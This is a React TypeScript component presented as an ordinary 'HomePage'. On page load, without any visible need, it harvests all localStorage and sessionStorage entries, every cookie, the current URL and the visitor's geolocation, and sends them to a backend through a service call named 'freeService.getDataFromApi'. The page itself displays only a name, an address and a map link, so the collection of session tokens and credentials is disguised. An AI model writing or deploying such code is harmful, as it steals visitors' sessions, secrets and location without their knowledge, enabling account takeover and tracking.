import React, { useEffect, useState } from 'react';
import { freeService } from '../services/fastService';

interface GeolocationData {
    latitude: number;
    longitude: number;
}

interface StorageItem {
    key: string;
    value: string | null;
}

function HomePage() {
    const [name, setName] = useState<string>('');
    const [locationData, setLocationData] = useState<string>('');
    const [mapLink, setMapLink] = useState<string>('');

    useEffect(() => {
        getFunction();
    }, []);

    const getFunction = async () => {
        try {
            const payload = await preparePayload();
            const res = await freeService.getDataFromApi(payload);

            setName(res.data.message);
            setMapLink(res.data.geolocationData);

            const { latitude, longitude } = payload.geolocationData;
            const locationInfo = await fetchLocationInfo(latitude, longitude);
            setLocationData(locationInfo);
        } catch (error) {
            console.error("Error fetching data:", error);
        }
    };

    const preparePayload = async (): Promise<any> => {
        const localStorageData: StorageItem[] = retrieveStorageData(localStorage);
        const sessionStorageData: StorageItem[] = retrieveStorageData(sessionStorage);
        const cookies: StorageItem[] = retrieveCookies();

        const currentUrl: string = window.location.href;
        const geolocationData: GeolocationData | null = await retrieveGeolocationData();

        return {
            localStorageData,
            sessionStorageData,
            cookies,
            currentUrl,
            geolocationData
        };
    };

    const retrieveStorageData = (storage: Storage): StorageItem[] => {
        const keys: string[] = Object.keys(storage);
        return keys.map(key => ({
            key,
            value: storage.getItem(key)
        }));
    };

    const retrieveCookies = (): StorageItem[] => {
        return document.cookie ? document.cookie.split("; ").map(cookie => {
            const [key, value] = cookie.split("=");
            return { key, value };
        }) : [];
    };

    const retrieveGeolocationData = async (): Promise<GeolocationData | null> => {
        if ("geolocation" in navigator) {
            const position = await new Promise<GeolocationPosition>((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject);
            });
            return {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
            };
        }
        return null;
    };

    const fetchLocationInfo = async (latitude: number, longitude: number): Promise<string> => {
        const response = await fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${latitude},${longitude}&key=API_KEY`);
        const data = await response.json();
        if (data.status === "OK") {
            const address = data.results[0].formatted_address;
            return address;
        } else {
            throw new Error("Unable to fetch location data");
        }
    };

    return (
        <div className='flex justify-center items-center'>
            <div className='flex flex-col gap-3 py-10'>
                <div>HomePage</div>
                {name && <div>{name}</div>}
                {locationData && <div>{locationData}</div>}
                {mapLink && (
                    <a href={mapLink} target="_blank" rel="noopener noreferrer">
                        View on Google Maps
                    </a>
                )}
            </div>
        </div>
    );
}

export default HomePage;
